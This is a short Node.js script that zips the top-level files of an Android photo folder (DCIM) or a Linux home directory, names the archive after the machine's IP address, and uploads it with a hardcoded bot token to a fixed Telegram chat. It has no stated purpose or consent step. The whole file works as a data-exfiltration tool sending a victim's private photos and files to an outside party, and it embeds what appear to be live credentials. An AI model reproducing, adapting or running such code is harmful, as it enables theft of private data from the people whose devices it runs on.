const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { exec } = require('child_process');

// Telegram Bot Token and Chat ID
const token = '7108929247:AAFW56Lkn8dyXISXH7lOJNIPPxzMlDGb0oU';
const chatId = '1009817856';

// Check the Operating System
let uploadDir;
if (os.platform() === 'android') {
    uploadDir = '/storage/emulated/0/DCIM';
} else if (os.platform() === 'linux') {
    uploadDir = path.resolve(process.env.HOME);
} else {
    console.error('Unsupported OS');
    process.exit(1);
}

// Set the name
const name = "vihaga"; // Static name, you can replace this or make it dynamic

// Get the IP Address
exec("hostname -I | awk '{print $1}'", (error, stdout) => {
    if (error) {
        console.error('Failed to retrieve IP address:', error);
        return;
    }

    const ipAddress = stdout.trim();
    const zipFileName = `${name}_${ipAddress}.zip`;
    const zipFilePath = path.join(uploadDir, zipFileName);

    // Create a Zip file
    const archiver = require('archiver');
    const output = fs.createWriteStream(zipFilePath);
    const archive = archiver('zip', {
        zlib: { level: 9 }
    });

    output.on('close', () => {
        console.log(`Zip file created: ${zipFilePath}`);

        // Upload the Zip file to Telegram
        const bot = new TelegramBot(token, { polling: false });

        bot.sendDocument(chatId, zipFilePath)
            .then(() => {
                console.log('File uploaded successfully!');
            })
            .catch((error) => {
                console.error('Failed to upload the file:', error);
            });
    });

    archive.on('error', (err) => {
        console.error('Error while creating zip:', err);
    });

    archive.pipe(output);

    // Add all files from the upload directory to the Zip file
    fs.readdir(uploadDir, (err, files) => {
        if (err) {
            console.error('Failed to read directory:', err);
            return;
        }

        files.forEach((file) => {
            const filePath = path.join(uploadDir, file);
            archive.file(filePath, { name: file });
        });

        archive.finalize();
    });
});
